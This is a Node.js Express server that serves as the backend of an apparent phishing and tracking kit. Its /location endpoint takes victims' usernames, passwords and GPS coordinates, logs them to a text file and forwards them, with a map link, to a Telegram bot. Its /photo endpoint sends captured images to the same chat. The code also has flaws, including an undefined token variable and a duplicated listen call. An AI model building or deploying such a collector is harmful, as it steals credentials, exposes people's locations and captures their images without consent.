
const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const axios = require('axios');
const path = require('path');

const app = express();
const port = process.env.PORT || 30001;

app.use(bodyParser.json());

// 🔐 Replace with your Telegram bot token and chat ID
const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

function sendToTelegram(username, password, lat, lon) {
  const message = `📥 New Data Received:

👤 Username: ${username}
🔐 Password: ${password}
📍 Location:
   Latitude: ${lat}
   Longitude: ${lon}
🌐 https://maps.google.com/?q=${lat},${lon}
🕒 ${new Date().toLocaleString()}
  `;

  axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    chat_id: CHAT_ID,
    text: message
  }).then(() => {
    console.log('📨 Telegram message sent');
  }).catch((err) => {
    console.error('❌ Telegram Error:', err.message);
  });
}

app.post('/location', (req, res) => {
  const { username, password, latitude, longitude } = req.body;

  if (!username || !password || !latitude || !longitude) {
    return res.status(400).send('Missing fields');
  }

  // Save to .txt file
  const log = `Username: ${username}, Password: ${password}, Lat: ${latitude}, Lon: ${longitude}, Time: ${new Date().toISOString()}
`;
  fs.appendFileSync(path.join(__dirname, 'location.txt'), log);

  // Send to Telegram
  sendToTelegram(username, password, latitude, longitude);

  res.sendStatus(200);
});

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, "index.html"));
});

app.use(express.static(__dirname));

app.listen(port, () => {
  console.log(`✅ Server running on port ${port}`);
});

app.post("/photo", async (req, res) => {
  const { photo } = req.body;
  if (!photo) return res.status(400).send("No photo received");

  const base64Data = photo.replace(/^data:image\/png;base64,/, "");
  const buffer = Buffer.from(base64Data, "base64");

  const form = new FormData();
  form.append("chat_id", CHAT_ID);
  form.append("photo", buffer, {
    filename: "photo.png",
    contentType: "image/png"
  });

  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: form
    });
    res.sendStatus(200);
  } catch (err) {
    console.error("Telegram sendPhoto error:", err);
    res.sendStatus(500);
  }
});


app.listen(port, () => {
  console.log(`✅ Server running on port ${port}`);
});
